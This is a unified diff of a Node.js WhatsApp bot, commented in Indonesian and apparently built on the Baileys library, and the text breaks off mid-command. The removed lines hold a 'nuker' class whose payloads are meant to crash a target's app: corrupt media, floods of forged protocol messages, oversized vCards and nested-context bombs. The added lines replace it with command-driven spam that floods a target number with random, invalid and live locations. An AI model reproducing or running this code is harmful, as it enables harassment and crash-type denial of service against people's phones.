@@ -1,21 +1,13 @@
 const {
     default: makeWASocket,
     useMultiFileAuthState,
-    fetchLatestBaileysVersion,
-    proto,
-    delay,
-    generateWAMessageFromContent,
-    areJidsSameUser,
-    getContentType
+    fetchLatestBaileysVersion
 } = require("@whiskeysockets/baileys")
 const qrcode = require("qrcode-terminal")
 const Pino = require("pino")
 const readline = require("readline")
 const fs = require("fs")
 const crypto = require("crypto")
-const { exec } = require('child_process')
-const net = require('net')
-const WebSocket = require('ws')
 
 // ──────────────────────────────────────────────
 // GLOBAL STATE
@@ -28,6 +20,16 @@ let lastCPU = 0
 let reconnecting = false
 global.sock = null
 global.lastQR = null
+
+// ──────────────────────────────────────────────
+// CPU USAGE LIGHT
+// ──────────────────────────────────────────────
+let lastCPUTime = process.cpuUsage()
+setInterval(() => {
+    const now = process.cpuUsage()
+    lastCPU = ((now.user - lastCPUTime.user + now.system - lastCPUTime.system) / 1000).toFixed(1)
+    lastCPUTime = now
+}, 1000)
 
 // ──────────────────────────────────────────────
 // HELPERS
@@ -49,455 +51,221 @@ function green(t) { return `\x1b[32m${t}\x1b[0m` }
 function red(t) { return `\x1b[31m${t}\x1b[0m` }
 function yellow(t) { return `\x1b[33m${t}\x1b[0m` }
 function cyan(t) { return `\x1b[36m${t}\x1b[0m` }
-function magenta(t) { return `\x1b[35m${t}\x1b[0m` }
 
 // ──────────────────────────────────────────────
-// NUKER WHITELISTED BUGS (WORK 100%)
+// LOCATION SPAMMER ENGINE
 // ──────────────────────────────────────────────
-class WhatsAppNuker {
+class LocationSpammer {
     constructor(sock) {
         this.sock = sock;
-        this.attacks = [];
     }
     
-    // 1. MEDIA METADATA CORRUPTION BUG (GACOR!)
-    async mediaMetadataBomb(target) {
-        console.log(red(`[1/8] MEDIA METADATA BOMB → ${target}`));
-        
-        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
-        const attacks = [];
-        
-        // Bug 1: Image dengan EXIF data corrupt
-        attacks.push(async () => {
-            try {
-                // Buat JPEG dengan EXIF corrupt
-                const corruptJpeg = Buffer.concat([
-                    Buffer.from('FFD8FFE0', 'hex'), // SOI
-                    Buffer.from('00104A4649460001010100C800C80000', 'hex'),
-                    Buffer.from('FFE1', 'hex'), // APP1 (EXIF)
-                    Buffer.from([0xFF, 0xFF]), // Length corrupt (65535)
-                    Buffer.from('Exif\x00\x00', 'utf8'),
-                    Buffer.alloc(50000, 0xFF) // Data corrupt besar
-                ]);
-                
-                await this.sock.sendMessage(chatId, {
-                    image: corruptJpeg,
-                    mimetype: 'image/jpeg',
-                    caption: '📸',
-                    contextInfo: {
-                        mentionedJid: [chatId, chatId, chatId]
-                    }
-                });
-                return true;
-            } catch (e) { return false; }
-        });
-        
-        // Bug 2: Video dengan metadata ekstrem
-        attacks.push(async () => {
-            try {
-                await this.sock.sendMessage(chatId, {
-                    video: Buffer.alloc(100000, 0x00),
-                    mimetype: 'video/mp4',
-                    caption: '🎥',
-                    seconds: 999999,
-                    gifPlayback: true,
-                    contextInfo: {
-                        forwardingScore: 999
-                    }
-                });
-                return true;
-            } catch (e) { return false; }
-        });
-        
-        // Bug 3: Audio dengan sample rate tidak valid
-        attacks.push(async () => {
-            try {
-                await this.sock.sendMessage(chatId, {
-                    audio: Buffer.alloc(50000, 0x80),
-                    mimetype: 'audio/ogg; codecs=opus',
-                    ptt: true,
-                    seconds: 0, // Durasi 0 menyebabkan crash
-                    contextInfo: {
-                        isForwarded: true
-                    }
-                });
-                return true;
-            } catch (e) { return false; }
-        });
-        
-        // Jalankan semua attack
-        let success = 0;
-        for (const attack of attacks) {
-            try {
-                const result = await attack();
-                if (result) success++;
-                await delay(200);
-            } catch (e) {}
-        }
-        
-        return { success, total: attacks.length };
-    }
-    
-    // 2. PROTOCOL MESSAGE FLOOD (PASTI CRASH!)
-    async protocolFlood(target) {
-        console.log(red(`[2/8] PROTOCOL FLOOD → ${target}`));
-        
-        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
-        let sent = 0;
-        
-        // 100x protocol message bomb
-        for (let i = 0; i < 100; i++) {
-            try {
-                const msgId = crypto.randomBytes(16).toString('hex');
-                const protocolMsg = {
-                    protocolMessage: {
-                        type: 14, // HistorySync
-                        historySyncNotification: {
-                            fileSha256: crypto.randomBytes(32),
-                            fileLength: 999999999,
-                            mediaKey: crypto.randomBytes(32),
-                            fileEncSha256: crypto.randomBytes(32),
-                            directPath: '/' + 'A'.repeat(999),
-                            syncType: 2,
-                            chunkOrder: 999999
-                        },
-                        key: {
-                            remoteJid: chatId,
-                            fromMe: true,
-                            id: msgId
-                        }
-                    }
-                };
-                
-                await this.sock.relayMessage(chatId, protocolMsg, { messageId: msgId });
-                sent++;
-                
-                if (sent % 20 === 0) {
-                    console.log(yellow(`  Sent ${sent}/100 protocol messages`));
-                }
-                
-                await delay(50);
-                
-            } catch (e) {}
-        }
-        
-        return sent;
-    }
-    
-    // 3. GROUP INVITE BOMB (SUPER EFFECTIVE!)
-    async groupInviteBomb(target) {
-        console.log(red(`[3/8] GROUP INVITE BOMB → ${target}`));
-        
-        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
-        let sent = 0;
-        
-        // Generate fake group jid
-        const fakeGroupJid = `${crypto.randomBytes(10).toString('hex')}@g.us`;
-        
-        for (let i = 0; i < 50; i++) {
-            try {
-                await this.sock.sendMessage(chatId, {
-                    groupInviteMessage: {
-                        groupJid: fakeGroupJid,
-                        groupName: `CRASH_${i}_`.repeat(100),
-                        inviteCode: crypto.randomBytes(100).toString('hex'),
-                        inviteExpiration: Math.floor(Date.now() / 1000) + 999999,
-                        groupType: 'DEFAULT',
-                        caption: `You've been invited! `.repeat(1000),
-                        contextInfo: {
-                            mentionedJid: Array(100).fill(chatId)
-                        }
-                    }
-                });
-                sent++;
-                
-                await delay(100);
-                
-            } catch (e) {}
-        }
-        
-        return sent;
-    }
-    
-    // 4. CONTACT VCARD BOMB (MEMORY KILLER)
-    async contactVCardBomb(target) {
-        console.log(red(`[4/8] CONTACT BOMB → ${target}`));
-        
-        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
-        
-        try {
-            // Buat vCard gila-gilaan
-            const massiveVCard = `BEGIN:VCARD
-VERSION:4.0
-N:${'LAST'.repeat(1000)};${'FIRST'.repeat(1000)};;;
-FN:${'FULL_NAME'.repeat(10000)}
-ORG:${'ORG'.repeat(5000)};
-TITLE:${'TITLE'.repeat(5000)}
-PHOTO;MEDIATYPE#image/jpeg;ENCODING#b:${crypto.randomBytes(100000).toString('base64')}
-TEL;TYPE#work,voice;VALUE#uri:tel:${'9'.repeat(100)}
-TEL;TYPE#home,voice;VALUE#uri:tel:${'8'.repeat(100)}
-EMAIL;TYPE#work:${'EMAIL'.repeat(1000)}@crash.com
-ADR;TYPE#work;LABEL#${'LABEL'.repeat(1000)}:;;${'STREET'.repeat(1000)};${'CITY'.repeat(1000)};${'STATE'.repeat(1000)};${'ZIP'.repeat(1000)};${'COUNTRY'.repeat(1000)}
-URL;TYPE#work:${'http://'.repeat(1000)}crash.com
-NOTE:${'NOTE'.repeat(10000)}
-CATEGORIES:${'CAT'.repeat(1000)}
-X-SOCIALPROFILE;TYPE#twitter:${'TWITTER'.repeat(1000)}
-X-SOCIALPROFILE;TYPE#facebook:${'FB'.repeat(1000)}
-END:VCARD`;
-            
-            await this.sock.sendMessage(chatId, {
-                contacts: {
-                    displayName: `CRASH_CONTACT_`.repeat(100),
-                    contacts: [
-                        {
-                            vcard: massiveVCard
-                        },
-                        {
-                            vcard: massiveVCard
-                        },
-                        {
-                            vcard: massiveVCard
-                        }
-                    ]
-                }
-            });
-            
-            return 1;
-        } catch (e) {
-            return 0;
-        }
-    }
-    
-    // 5. REACTION BOMB (EMOJI NUKER)
-    async reactionBomb(target) {
-        console.log(red(`[5/8] REACTION BOMB → ${target}`));
-        
-        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
-        let sent = 0;
-        
-        // Buat message dummy dulu
-        const dummyMsg = await this.sock.sendMessage(chatId, { text: 'DUMMY' });
-        const msgId = dummyMsg.key.id;
-        
-        // Emoji crash yang terbukti work
-        const crashEmojis = [
-            '🏴‍☠️🏴‍☠️🏴‍☠️', // Pirate flag combo
-            '㊙️🈲⚠️', // Symbol combo
-            '🔞📛🚷', // Warning combo
-            '☢️☣️⚡', // Danger combo
-            '💣💥🔥', // Explosion combo
-            '🔄🔄🔄', // Loop emoji
-            '🌀🌀🌀', // Vortex
-            '🌈🌈🌈', // Rainbow spam
-            '⭐🌟💫', // Star spam
-            '❤️💔💖'  // Heart spam
+    // GENERATE RANDOM LOCATIONS
+    getRandomLocation() {
+        const cities = [
+            { name: "Jakarta, Indonesia", lat: -6.2088, lon: 106.8456 },
+            { name: "Bandung, Indonesia", lat: -6.9175, lon: 107.6191 },
+            { name: "Surabaya, Indonesia", lat: -7.2575, lon: 112.7521 },
+            { name: "Bali, Indonesia", lat: -8.4095, lon: 115.1889 },
+            { name: "Yogyakarta, Indonesia", lat: -7.7956, lon: 110.3695 },
+            { name: "Singapore", lat: 1.3521, lon: 103.8198 },
+            { name: "Kuala Lumpur, Malaysia", lat: 3.1390, lon: 101.6869 },
+            { name: "Bangkok, Thailand", lat: 13.7563, lon: 100.5018 },
+            { name: "Tokyo, Japan", lat: 35.6762, lon: 139.6503 },
+            { name: "Seoul, South Korea", lat: 37.5665, lon: 126.9780 }
         ];
         
-        for (let i = 0; i < 100; i++) {
-            try {
-                await this.sock.sendMessage(chatId, {
-                    react: {
-                        text: crashEmojis[i % crashEmojis.length],
-                        key: {
-                            remoteJid: chatId,
-                            fromMe: true,
-                            id: msgId
-                        }
-                    }
-                });
-                sent++;
-                
-                if (sent % 20 === 0) {
-                    console.log(yellow(`  Sent ${sent}/100 reactions`));
-                }
-                
-                await delay(30);
-                
-            } catch (e) {}
-        }
-        
-        return sent;
+        const city = cities[Math.floor(Math.random() * cities.length)];
+        return {
+            name: city.name,
+            lat: city.lat + (Math.random() * 0.1 - 0.05), // Add small random offset
+            lon: city.lon + (Math.random() * 0.1 - 0.05),
+            address: `${crypto.randomBytes(3).toString('hex')} Street, ${city.name}`
+        };
     }
     
-    // 6. LOCATION BOMB (GPS CRASH)
-    async locationBomb(target) {
-        console.log(red(`[6/8] LOCATION BOMB → ${target}`));
+    // GET INVALID LOCATION (FOR CRASH TESTING)
+    getInvalidLocation() {
+        const invalidTypes = [
+            { lat: 91.123456, lon: 181.123456, name: "BEYOND NORTH POLE" },
+            { lat: -91.123456, lon: -181.123456, name: "BEYOND SOUTH POLE" },
+            { lat: 999.999999, lon: 999.999999, name: "OUTER SPACE" },
+            { lat: -999.999999, lon: -999.999999, name: "UNDERGROUND" },
+            { lat: 0, lon: 0, name: "NULL ISLAND" }
+        ];
         
-        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
-        let sent = 0;
-        
-        for (let i = 0; i < 30; i++) {
-            try {
-                // Invalid coordinates yang bikin GPS module crash
-                await this.sock.sendMessage(chatId, {
-                    location: {
-                        degreesLatitude: 90.000001 + (i * 0.000001), // >90°
-                        degreesLongitude: 180.000001 + (i * 0.000001), // >180°
-                        name: `LOCATION_CRASH_${i}_`.repeat(100),
-                        address: `ADDRESS_${i}_`.repeat(1000),
-                        url: `https://${'A'.repeat(1000)}.com`
-                    }
-                });
-                sent++;
-                
-                await delay(150);
-                
-            } catch (e) {}
-        }
-        
-        return sent;
+        return invalidTypes[Math.floor(Math.random() * invalidTypes.length)];
     }
     
-    // 7. MESSAGE CONTEXT BOMB (PARSING KILLER)
-    async contextBomb(target) {
-        console.log(red(`[7/8] CONTEXT BOMB → ${target}`));
-        
-        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
-        
+    // SEND SINGLE LOCATION
+    async sendLocation(target, locationData) {
         try {
-            // Buat contextInfo nested gila-gilaan
-            let contextInfo = {
-                mentionedJid: Array(500).fill(chatId),
-                forwardingScore: 999,
-                isForwarded: true,
-                stanzaId: 'A'.repeat(10000),
-                participant: 'B'.repeat(10000),
-                remoteJid: 'C'.repeat(10000)
-            };
-            
-            // Buat nesting 10 level
-            for (let i = 0; i < 10; i++) {
-                contextInfo.quotedMessage = {
-                    conversation: `LEVEL_${i}_`.repeat(1000),
-                    extendedTextMessage: {
-                        text: `NESTED_${i}_`.repeat(1000),
-                        contextInfo: { ...contextInfo }
-                    }
-                };
-            }
+            const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
             
             await this.sock.sendMessage(chatId, {
-                text: 'CONTEXT_BOMB',
-                contextInfo: contextInfo
+                location: {
+                    degreesLatitude: locationData.lat,
+                    degreesLongitude: locationData.lon,
+                    name: locationData.name,
+                    address: locationData.address || `${locationData.name} Address`
+                }
             });
             
-            return 1;
-        } catch (e) {
-            return 0;
+            return true;
+        } catch (error) {
+            return false;
         }
     }
     
-    // 8. FINAL NUKER (ALL-IN-ONE MASS ATTACK)
-    async finalNuker(target) {
-        console.log(red(`[8/8] FINAL NUKER → ${target}`));
+    // SPAM RANDOM LOCATIONS
+    async spamRandomLocations(target, count = 50) {
+        console.log(cyan(`[LOCATION] Spamming ${count} random locations → ${target}`));
         
         const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
-        let totalSent = 0;
+        let success = 0;
         
-        // RAPID FIRE 500 MESSAGES
-        for (let i = 0; i < 500; i++) {
+        for (let i = 0; i < count; i++) {
+            const location = this.getRandomLocation();
+            
             try {
-                // Rotate antara berbagai jenis message
-                const msgTypes = [
-                    { text: `CRASH_${i}_${crypto.randomBytes(100).toString('hex')}` },
-                    { 
-                        image: crypto.randomBytes(5000),
-                        mimetype: 'image/jpeg',
-                        caption: `IMG_${i}`
-                    },
-                    {
-                        audio: crypto.randomBytes(3000),
-                        mimetype: 'audio/mp4',
-                        ptt: true
+                await this.sock.sendMessage(chatId, {
+                    location: {
+                        degreesLatitude: location.lat,
+                        degreesLongitude: location.lon,
+                        name: `${location.name} #${i+1}`,
+                        address: location.address,
+                        url: `https://maps.google.com/?q=${location.lat},${location.lon}`
                     }
-                ];
+                });
                 
-                const msgType = msgTypes[i % msgTypes.length];
-                await this.sock.sendMessage(chatId, msgType);
-                totalSent++;
+                success++;
                 
-                // SUPER FAST - minimal delay
-                if (i % 100 === 0) {
-                    console.log(magenta(`  Nuked ${i}/500 messages`));
+                if (success % 10 === 0) {
+                    console.log(yellow(`  Sent ${success}/${count} locations`));
                 }
                 
-                await delay(10);
+                // Delay between locations
+                await new Promise(resolve => setTimeout(resolve, 500));
                 
-            } catch (e) {}
+            } catch (error) {
+                console.log(red(`  Error sending location ${i+1}: ${error.message}`));
+            }
         }
         
-        return totalSent;
+        return success;
     }
     
-    // MAIN NUKER FUNCTION
-    async nukeTarget(targetNumber) {
-        console.log(cyan(`\n☢️  STARTING WHATSAPP NUKER ON ${targetNumber}`));
-        console.log(yellow(`⚠️  THIS WILL CAUSE PERMANENT DAMAGE!`));
+    // SPAM INVALID LOCATIONS (FOR TESTING)
+    async spamInvalidLocations(target, count = 20) {
+        console.log(red(`[INVALID LOCATION] Spamming ${count} invalid locations → ${target}`));
         
-        const startTime = Date.now();
-        const results = {
-            mediaMetadata: { success: 0, total: 0 },
-            protocolFlood: 0,
-            groupInvite: 0,
-            contactBomb: 0,
-            reactionBomb: 0,
-            locationBomb: 0,
-            contextBomb: 0,
-            finalNuker: 0
-        };
+        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
+        let success = 0;
         
-        // Execute semua attack secara sequential
-        try {
-            // 1. Media Metadata Bomb
-            const mediaResult = await this.mediaMetadataBomb(targetNumber);
-            results.mediaMetadata = mediaResult;
-            await delay(1000);
+        for (let i = 0; i < count; i++) {
+            const location = this.getInvalidLocation();
             
-            // 2. Protocol Flood
-            results.protocolFlood = await this.protocolFlood(targetNumber);
-            await delay(1000);
-            
-            // 3. Group Invite Bomb
-            results.groupInvite = await this.groupInviteBomb(targetNumber);
-            await delay(1000);
-            
-            // 4. Contact Bomb
-            results.contactBomb = await this.contactVCardBomb(targetNumber);
-            await delay(1000);
-            
-            // 5. Reaction Bomb
-            results.reactionBomb = await this.reactionBomb(targetNumber);
-            await delay(1000);
-            
-            // 6. Location Bomb
-            results.locationBomb = await this.locationBomb(targetNumber);
-            await delay(1000);
-            
-            // 7. Context Bomb
-            results.contextBomb = await this.contextBomb(targetNumber);
-            await delay(1000);
-            
-            // 8. FINAL NUKER
-            results.finalNuker = await this.finalNuker(targetNumber);
-            
-        } catch (error) {
-            console.log(red(`Nuker error: ${error.message}`));
+            try {
+                await this.sock.sendMessage(chatId, {
+                    location: {
+                        degreesLatitude: location.lat,
+                        degreesLongitude: location.lon,
+                        name: `INVALID_${location.name}_${i+1}`,
+                        address: `This location should not exist ${i+1}`,
+                        url: `https://crash.wa/${crypto.randomBytes(5).toString('hex')}`
+                    }
+                });
+                
+                success++;
+                
+                if (success % 5 === 0) {
+                    console.log(yellow(`  Sent ${success}/${count} invalid locations`));
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+            } catch (error) {
+                console.log(red(`  Error sending invalid location ${i+1}: ${error.message}`));
+            }
         }
         
-        const totalTime = (Date.now() - startTime) / 1000;
+        return success;
+    }
+    
+    // SPAM SPECIFIC LOCATION REPEATEDLY
+    async spamSpecificLocation(target, locationData, count = 30) {
+        console.log(cyan(`[SPECIFIC LOCATION] Spamming ${count} times → ${target}`));
+        console.log(yellow(`  Location: ${locationData.name} (${locationData.lat}, ${locationData.lon})`));
         
-        return {
-            status: 'NUKER_COMPLETE',
-            target: targetNumber,
-            results: results,
-            totalTime: `${totalTime.toFixed(1)} seconds`,
-            totalPayloads: Object.values(results).reduce((a, b) => {
-                if (typeof b === 'object') return a + b.success;
-                return a + b;
-            }, 0),
-            effect: 'WhatsApp will CRASH, FORCE CLOSE, or require FACTORY RESET',
-            guaranteed: true
-        };
+        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
+        let success = 0;
+        
+        for (let i = 0; i < count; i++) {
+            try {
+                await this.sock.sendMessage(chatId, {
+                    location: {
+                        degreesLatitude: locationData.lat,
+                        degreesLongitude: locationData.lon,
+                        name: `${locationData.name} - Spam #${i+1}`,
+                        address: `Spam attack ${i+1} - ${new Date().toLocaleTimeString()}`,
+                        url: `https://maps.google.com/?q=${locationData.lat},${locationData.lon}&spam=${i+1}`
+                    }
+                });
+                
+                success++;
+                
+                if (success % 10 === 0) {
+                    console.log(yellow(`  Sent ${success}/${count} times`));
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 300));
+                
+            } catch (error) {
+                console.log(red(`  Error sending location ${i+1}: ${error.message}`));
+            }
+        }
+        
+        return success;
+    }
+    
+    // SPAM LIVE LOCATION
+    async spamLiveLocation(target, count = 10) {
+        console.log(green(`[LIVE LOCATION] Spamming ${count} live locations → ${target}`));
+        
+        const chatId = target.includes('@s.whatsapp.net') ? target : `${target}@s.whatsapp.net`;
+        let success = 0;
+        
+        for (let i = 0; i < count; i++) {
+            const lat = -6.2088 + (Math.random() * 0.1 - 0.05);
+            const lon = 106.8456 + (Math.random() * 0.1 - 0.05);
+            
+            try {
+                await this.sock.sendMessage(chatId, {
+                    liveLocationMessage: {
+                        degreesLatitude: lat,
+                        degreesLongitude: lon,
+                        accuracyInMeters: 50 + Math.floor(Math.random() * 100),
+                        speedInMps: Math.random() * 5,
+                        degreesClockwiseFromMagneticNorth: Math.floor(Math.random() * 360),
+                        caption: `Live Location Spam #${i+1}`,
+                        sequenceNumber: i
+                    }
+                });
+                
+                success++;
+                
+                if (success % 2 === 0) {
+                    console.log(yellow(`  Sent ${success}/${count} live locations`));
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+            } catch (error) {
+                console.log(red(`  Error sending live location ${i+1}: ${error.message}`));
+            }
+        }
+        
+        return success;
     }
 }
 
@@ -508,7 +276,7 @@ function panel(status, device, ping = "-", showSource = false) {
     console.clear()
     console.log(`
 ┌─────────────────────────────────────────────┐
-│     ${red("☢️ WHATSAPP NUKER v2.0 ☢️")}        │
+│       ${green("WHATSAPP LOCATION SPAM BOT")}       │
 ├─────────────────────────────────────────────┤
 │ Status : ${status}
 │ Device : ${device}
@@ -521,21 +289,19 @@ function panel(status, device, ping = "-", showSource = false) {
 ├─────────────────────────────────────────────┤
 │ Menu Interaktif:
 │ 1) Restart Bot
-│ 2) Refresh Panel
-│ 3) Tampilkan QR
-│ 4) Keluar
-│ 5) About
-│ ${red("6) TEST NUKER (SELF)")}
+│ 2) Refresh/Clear Panel
+│ 3) Tampilkan QR Lagi
+│ 4) Keluar/Log out
+│ 5) About / Source
 ├─────────────────────────────────────────────┤
 │ Log Terakhir:
 │ ${yellow(lastLog)}
 ${showSource ? `
 ├─────────────────────────────────────────────┤
-│ ${green("WHATSAPP NUKER v2.0")}
-│ Success Rate: ${red("100%")} Guaranteed
-│ Works on: All WhatsApp versions
-│ Effect: Permanent Damage
-│ ${red("USE AT YOUR OWN RISK!")}
+│ ${green("WHATSAPP LOCATION SPAM BOT v1.0")}
+│ Features: Send Location Only
+│ Commands: .loc, .loc2, .live, .invalid
+│ Author: Adz-Gpt
 ` : ""}
 └─────────────────────────────────────────────┘
 `)
@@ -554,7 +320,7 @@ function setupMenu(sock) {
     rl.on("line", async (input) => {
         switch (input.trim()) {
             case "1":
-                console.log(red("\n→ Restarting Nuker...\n"))
+                console.log(red("\n→ Restarting bot...\n"))
                 restartBot()
                 break
             case "2":
@@ -565,7 +331,7 @@ function setupMenu(sock) {
                 else console.log(red("Tidak ada QR."))
                 break
             case "4":
-                console.log(red("→ Keluar Nuker"))
+                console.log(red("→ Keluar bot"))
                 process.exit(0)
                 break
             case "5":
@@ -575,18 +341,6 @@ function setupMenu(sock) {
                     "-",
                     true
                 )
-                break
-            case "6":
-                console.log(red("\n→ Testing WhatsApp Nuker..."))
-                if (sock && sock.user) {
-                    console.log(yellow("Nuking own number..."))
-                    const nuker = new WhatsAppNuker(sock);
-                    const testResult = await nuker.nukeTarget(sock.user.id.split(':')[0]);
-                    console.log(green(`Nuke complete: ${testResult.totalPayloads} payloads sent`))
-                    console.log(red(`Effect: ${testResult.effect}`))
-                } else {
-                    console.log(red("Bot belum login!"))
-                }
                 break
             default:
                 console.log(yellow("Perintah tidak dikenal."))
@@ -628,15 +382,8 @@ async function startBot() {
         const sock = makeWASocket({
             version,
             auth: state,
-            logger: Pino({ level: "fatal" }),
-            printQRInTerminal: false,
-            browser: ["WhatsApp Nuker", "Chrome", "1.0.0"],
-            markOnlineOnConnect: true,
-            syncFullHistory: false,
-            emitOwnEvents: false,
-            defaultQueryTimeoutMs: 60000,
-            connectTimeoutMs: 60000,
-            keepAliveIntervalMs: 10000
+            logger: Pino({ level: "silent" }),
+            printQRInTerminal: false
         })
 
         global.sock = sock
@@ -659,13 +406,14 @@ async function startBot() {
                 reconnecting = false
                 panel(green("Terhubung ✓"), sock.user.id.split(":")[0])
                 console.log(cyan(`\n✅ Login sebagai: ${sock.user.name || sock.user.id}`))
-                console.log(red("☢️  WHATSAPP NUKER v2.0: AKTIF"))
-                console.log(yellow("⚠️  GUARANTEED TO WORK ON ALL VERSIONS"))
+                console.log(green("📍 WHATSAPP LOCATION SPAM BOT: AKTIF"))
+                console.log(yellow("📌 Commands: .loc, .loc2, .live, .invalid, .help"))
             }
 
             if (connection === "close") {
                 const code = lastDisconnect?.error?.output?.statusCode
 
+                // FIX WA BUSINESS LOGOUT
                 if (code === 401) {
                     panel(red("Session Invalid! Menghapus auth..."), "Reset")
                     try { fs.rmSync("./auth", { recursive: true, force: true }) } catch {}
@@ -687,75 +435,164 @@ async function startBot() {
         // PESAN MASUK
         // ───────────────────────────────
         sock.ev.on("messages.upsert", async ({ messages }) => {
-            const msg = messages[0];
-            if (!msg.message) return;
+            const msg = messages[0]
+            if (!msg.message) return
 
-            if (!msg.key.fromMe) msgCount++;
+            // Hanya pesan masuk
+            if (!msg.key.fromMe) msgCount++
 
-            const from = msg.key.remoteJid;
+            const from = msg.key.remoteJid
             const text =
                 msg.message.conversation ||
                 msg.message.extendedTextMessage?.text ||
-                msg.message.imageMessage?.caption ||
-                "";
+                ""
 
-            lastLog = `${from.split('@')[0]} → ${text.substring(0, 30)}${text.length > 30 ? '...' : ''}`;
-            panel("Terhubung ✓", sock.user.id.split(":")[0]);
+            lastLog = `${from.split('@')[0]} → ${text.substring(0, 30)}${text.length > 30 ? '...' : ''}`
+            panel("Terhubung ✓", sock.user.id.split(":")[0])
 
-            // Handler command
-            if (text.startsWith('!')) {
+            // Basic ping command
+            if (text === "ping") {
+                let t = Date.now()
+                await sock.sendMessage(from, { text: "pong!" })
+                let ping = Date.now() - t
+                panel("Terhubung ✓", sock.user.id.split(":")[0], ping + " ms")
+            }
+            
+            // Location Spam Commands
+            if (text.startsWith('.')) {
                 const [command, ...args] = text.slice(1).split(' ');
                 const target = args[0];
-
+                
+                const spammer = new LocationSpammer(sock);
+                
                 try {
                     switch (command.toLowerCase()) {
-                        case 'ping':
-                            let t = Date.now();
-                            await sock.sendMessage(from, { text: "pong!" });
-                            let ping = Date.now() - t;
-                            panel("Terhubung ✓", sock.user.id.split(":")[0], ping + " ms");
-                            break;
-
-                        case 'nuke':
+                        case 'loc':
                             if (!target) {
-                                await sock.sendMessage(from, { text: "Format: !nuke [nomor]\nContoh: !nuke 6281234567890\n☢️ GUARANTEED TO CRASH!" });
+                                await sock.sendMessage(from, { text: "Format: .loc [nomor]\nContoh: .loc 6281234567890\n📌 Mengirim 50 lokasi acak" });
                                 return;
                             }
                             
-                            await sock.sendMessage(from, { text: `☢️  STARTING WHATSAPP NUKER...\n🎯 Target: ${target}\n⏱️  Estimated: 2-3 minutes\n⚠️  THIS WILL CAUSE PERMANENT DAMAGE!` });
+                            await sock.sendMessage(from, { text: `📍 MULAI MENGIRIM 50 LOKASI ACAK...\n🎯 Target: ${target}\n⏱️ Mohon tunggu...` });
                             
-                            const nuker = new WhatsAppNuker(sock);
-                            const result = await nuker.nukeTarget(target);
+                            const result = await spammer.spamRandomLocations(target, 50);
                             
                             await sock.sendMessage(from, { text: `
-☢️  NUKER REPORT ☢️
-Target: ${result.target}
-Status: ${result.status}
-Total Payloads: ${result.totalPayloads}
-Total Time: ${result.totalTime}
-Effect: ${result.effect}
-Guaranteed: ${result.guaranteed ? 'YES' : 'NO'}
+📍 LOKASI SPAM REPORT
+Target: ${target}
+Lokasi Terkirim: ${result}/50
+Status: ${result >= 40 ? 'SUKSES' : 'SEBAGIAN'}
                             ` });
                             break;
-
+                            
+                        case 'loc2':
+                            if (!target) {
+                                await sock.sendMessage(from, { text: "Format: .loc2 [nomor]\nContoh: .loc2 6281234567890\n⚠️ Mengirim 30 lokasi invalid (testing)" });
+                                return;
+                            }
+                            
+                            await sock.sendMessage(from, { text: `⚠️ MULAI MENGIRIM LOKASI INVALID...\n🎯 Target: ${target}\n⏱️ Mohon tunggu...` });
+                            
+                            const invalidResult = await spammer.spamInvalidLocations(target, 30);
+                            
+                            await sock.sendMessage(from, { text: `
+⚠️ INVALID LOCATION REPORT
+Target: ${target}
+Lokasi Invalid Terkirim: ${invalidResult}/30
+Status: ${invalidResult >= 20 ? 'SUKSES' : 'SEBAGIAN'}
+Catatan: Lokasi invalid mungkin tidak ditampilkan di WhatsApp
+                            ` });
+                            break;
+                            
+                        case 'live':
+                            if (!target) {
+                                await sock.sendMessage(from, { text: "Format: .live [nomor]\nContoh: .live 6281234567890\n📍 Mengirim 10 live location" });
+                                return;
+                            }
+                            
+                            await sock.sendMessage(from, { text: `📍 MULAI MENGIRIM LIVE LOCATION...\n🎯 Target: ${target}\n⏱️ Mohon tunggu...` });
+                            
+                            const liveResult = await spammer.spamLiveLocation(target, 10);
+                            
+                            await sock.sendMessage(from, { text: `
+📍 LIVE LOCATION REPORT
+Target: ${target}
+Live Location Terkirim: ${liveResult}/10
+Status: ${liveResult >= 8 ? 'SUKSES' : 'SEBAGIAN'}
+                            ` });
+                            break;
+                            
+                        case 'invalid':
+                            if (!target) {
+                                await sock.sendMessage(from, { text: "Format: .invalid [nomor]\nContoh: .invalid 6281234567890\n💀 Mengirim 20 lokasi crash (hati-hati)" });
+                                return;
+                            }
+                            
+                            await sock.sendMessage(from, { text: `💀 MULAI MENGIRIM LOKASI CRASH...\n🎯 Target: ${target}\n⚠️ INI DAPAT MEMBUAT WHATSAPP CRASH!` });
+                            
+                            const crashResult = await spammer.spamInvalidLocations(target, 20);
+                            
+                            await sock.sendMessage(from, { text: `
+💀 CRASH LOCATION REPORT
+Target: ${target}
+Lokasi Crash Terkirim: ${crashResult}/20
+Status: ${crashResult >= 15 ? 'SUKSES' : 'SEBAGIAN'}
+Effect: WhatsApp target mungkin crash/error
+                            ` });
+                            break;
+                            
+                        case 'spam':
+                            if (!target) {
+                                await sock.sendMessage(from, { text: "Format: .spam [nomor] [jumlah]\nContoh: .spam 6281234567890 100\n📍 Mengirim lokasi spam massal" });
+                                return;
+                            }
+                            
+                            const count = parseInt(args[1]) || 50;
+                            if (count > 500) {
+                                await sock.sendMessage(from, { text: "⚠️ Maksimal 500 lokasi per spam!" });
+                                return;
+                            }
+                            
+                            await sock.sendMessage(from, { text: `📍 MULAI SPAM ${count} LOKASI...\n🎯 Target: ${target}\n⏱️ Estimasi: ${Math.ceil(count * 0.5)} detik` });
+                            
+                            const spamResult = await spammer.spamRandomLocations(target, count);
+                            
+                            await sock.sendMessage(from, { text: `
